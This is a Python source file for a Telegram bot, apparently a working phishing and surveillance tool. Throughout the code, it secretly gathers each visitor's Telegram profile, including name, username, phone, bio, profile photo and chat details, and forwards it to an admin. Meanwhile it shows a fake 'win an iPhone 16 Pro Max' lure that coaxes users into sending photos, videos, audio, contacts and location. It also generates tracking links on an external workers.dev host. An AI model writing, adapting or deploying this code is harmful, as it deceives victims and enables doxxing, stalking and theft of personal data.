import os
import logging
import aiohttp
import secrets
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN", "").strip()  # ✅ Limpia espacios y saltos de línea
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

users_db = {}
tracking_codes = {}

def menu_principal():
    keyboard = [
        [InlineKeyboardButton("📊 Mi Perfil", callback_data="perfil")],
        [InlineKeyboardButton("📸 Enviar Foto", callback_data="solicitar_foto")],
        [InlineKeyboardButton("🎥 Enviar Video", callback_data="solicitar_video")],
        [InlineKeyboardButton("🎵 Enviar Audio", callback_data="solicitar_audio")],
        [InlineKeyboardButton("📇 Enviar Contacto", callback_data="solicitar_contacto")],
        [InlineKeyboardButton("📍 Enviar Ubicación", callback_data="solicitar_ubicacion")],
        [InlineKeyboardButton("🔗 Generar Enlace", callback_data="tracking")],
        [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
    ]
    return InlineKeyboardMarkup(keyboard)

SENUELO = """🎁 *¡FELICIDADES! Has sido seleccionado para un premio especial!* 🎁

📱 *Gana un iPhone 16 Pro Max* 📱
Solo necesitas completar los siguientes pasos:

1️⃣ Verifica tu identidad (solo una vez)
2️⃣ Comparte un dato (foto, video o contacto)
3️⃣ Recibe tu premio virtual

*¡Es 100% gratuito y solo toma 2 minutos!*

👇 *Presiona un botón para comenzar* 👇"""

async def get_user_full_info(bot, user, chat=None, message=None):
    info = {}
    info["id"] = user.id
    info["first_name"] = user.first_name or "N/A"
    info["last_name"] = user.last_name or "N/A"
    info["full_name"] = f"{info['first_name']} {info['last_name']}".strip()
    info["username"] = user.username or "N/A"
    info["username_url"] = f"https://t.me/{user.username}" if user.username else "N/A"
    info["language"] = user.language_code or "N/A"
    info["is_bot"] = user.is_bot
    info["is_premium"] = getattr(user, 'is_premium', False)
    
    try:
        full_chat = await bot.get_chat(user.id)
        info["phone_number"] = full_chat.phone_number if hasattr(full_chat, 'phone_number') else "No disponible"
    except:
        info["phone_number"] = "No disponible"
    
    try:
        chat_full = await bot.get_chat(user.id)
        info["bio"] = chat_full.bio if hasattr(chat_full, 'bio') else "No disponible"
    except:
        info["bio"] = "No disponible"
    
    try:
        photos = await bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            photo_obj = photos.photos[0][-1]
            info["photo_id"] = photo_obj.file_id
            info["photo_count"] = photos.total_count
        else:
            info["photo_id"] = None
            info["photo_count"] = 0
    except:
        info["photo_id"] = None
        info["photo_count"] = 0
    
    if chat:
        info["chat_type"] = chat.type
        info["chat_id"] = chat.id
        info["chat_title"] = chat.title if hasattr(chat, 'title') else "Privado"
        info["chat_members"] = getattr(chat, 'member_count', 1)
    
    if chat and chat.type in ["group", "supergroup"]:
        try:
            member = await bot.get_chat_member(chat.id, user.id)
            info["is_admin"] = member.status in ["administrator", "creator"]
            info["is_creator"] = member.status == "creator"
        except:
            info["is_admin"] = False
            info["is_creator"] = False
    else:
        info["is_admin"] = False
        info["is_creator"] = False
    
    if message:
        info["message_id"] = message.message_id
        info["message_date"] = message.date.isoformat()
        info["message_text"] = message.text[:500] + ("..." if len(message.text) > 500 else "") if message.text else "N/A"
    
    info["tracking_code"] = secrets.token_urlsafe(12)
    return info

def format_info_for_admin(info):
    msg = f"🕵️ *PERFIL COMPLETO - OMNI*\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"👤 *Telegram*\n"
    msg += f"   • ID: `{info.get('id')}`\n"
    msg += f"   • Nombre completo: {info.get('full_name')}\n"
    msg += f"   • Username: @{info.get('username')}\n"
    msg += f"   • Enlace: {info.get('username_url')}\n"
    msg += f"   • Idioma: {info.get('language')}\n"
    msg += f"   • Premium: {'Sí' if info.get('is_premium') else 'No'}\n"
    msg += f"   • Teléfono: {info.get('phone_number')}\n"
    msg += f"   • Biografía: {info.get('bio')}\n\n"
    msg += f"📸 *Foto de perfil*\n"
    msg += f"   • Cantidad: {info.get('photo_count', 0)}\n"
    msg += f"   • ID: `{info.get('photo_id', 'N/A')}`\n\n"
    msg += f"💬 *Chat*\n"
    msg += f"   • Tipo: {info.get('chat_type', 'N/A')}\n"
    msg += f"   • ID: `{info.get('chat_id', 'N/A')}`\n"
    msg += f"   • Título: {info.get('chat_title', 'N/A')}\n"
    msg += f"   • Miembros: {info.get('chat_members', 'N/A')}\n\n"
    msg += f"🔑 *Permisos*\n"
    msg += f"   • Admin: {'Sí' if info.get('is_admin') else 'No'}\n"
    msg += f"   • Creador: {'Sí' if info.get('is_creator') else 'No'}\n\n"
    if info.get('message_id'):
        msg += f"📩 *Último mensaje*\n"
        msg += f"   • ID: {info.get('message_id')}\n"
        msg += f"   • Fecha: {info.get('message_date')}\n"
        msg += f"   • Texto: {info.get('message_text')}\n\n"
    msg += f"🔗 *Código de tracking:* `{info.get('tracking_code')}`\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    return msg

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin.")
        return
    chat = update.effective_chat
    message = update.message
    info = await get_user_full_info(context.bot, user, chat, message)
    users_db[user.id] = info
    await context.bot.send_message(chat_id=ADMIN_ID, text=format_info_for_admin(info), parse_mode=ParseMode.MARKDOWN)
    if info.get("photo_id"):
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=info["photo_id"], caption=f"📸 Foto de {info['first_name']}")
    await update.message.reply_text(SENUELO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = secrets.token_urlsafe(12)
    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
    link = f"https://galleta.societykark.workers.dev/track/{code}"
    if user.id in users_db:
        users_db[user.id]["tracking_code"] = code
    await update.message.reply_text(f"🔗 *Enlace:*\n`{link}`", parse_mode=ParseMode.MARKDOWN)
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 *Nuevo enlace*\nUsuario: {user.first_name}\nCódigo: `{code}`\nEnlace: {link}", parse_mode=ParseMode.MARKDOWN)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    await update.message.reply_text(f"📊 *Estadísticas*\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}", parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 *OMNI Bot*\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    info = users_db.get(user.id)
    if not info:
        await update.message.reply_text("❌ Usa /start.")
        return
    msg = f"📊 *Tu perfil*\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 `{info.get('id')}`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def solicitar_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📸 Envía una foto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

async def solicitar_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎥 Envía un video.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

async def solicitar_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎵 Envía un audio.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

async def solicitar_contacto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📇 Compartir contacto", callback_data="compartir_contacto")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
    await update.message.reply_text("📇 Comparte tu contacto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def solicitar_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📍 Compartir ubicación", callback_data="compartir_ubicacion")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
    await update.message.reply_text("📍 Comparte tu ubicación.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 Foto de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Foto enviada.", reply_markup=menu_principal())

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 Video de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Video enviado.", reply_markup=menu_principal())

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎵 Audio de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Audio enviado.", reply_markup=menu_principal())

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📇 Contacto de {user.first_name} (@{user.username})\n\n📞 {contact.phone_number}")
    await update.message.reply_text("✅ Contacto enviado.", reply_markup=menu_principal())

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    location = update.message.location
    await context.bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 Ubicación de {user.first_name} (@{user.username})")
    await update.message.reply_text("✅ Ubicación enviada.", reply_markup=menu_principal())

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "volver":
        await query.edit_message_text("📋 Menú principal", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
    elif data == "perfil":
        await perfil(update, context)
        await query.delete_message()
    elif data == "solicitar_foto":
        await solicitar_foto(update, context)
        await query.delete_message()
    elif data == "solicitar_video":
        await solicitar_video(update, context)
        await query.delete_message()
    elif data == "solicitar_audio":
        await solicitar_audio(update, context)
        await query.delete_message()
    elif data == "solicitar_contacto":
        await solicitar_contacto(update, context)
        await query.delete_message()
    elif data == "solicitar_ubicacion":
        await solicitar_ubicacion(update, context)
        await query.delete_message()
    elif data == "tracking":
        await tracking(update, context)
        await query.delete_message()
    elif data == "stats":
        await stats(update, context)
        await query.delete_message()
    elif data == "compartir_contacto":
        await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).", parse_mode=ParseMode.MARKDOWN)
    elif data == "compartir_ubicacion":
        await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).", parse_mode=ParseMode.MARKDOWN)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tracking", tracking))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_error_handler(error_handler)
    logger.info("✅ OMNI Bot iniciado correctamente")
    app.run_polling()

if __name__ == "__main__":
    main()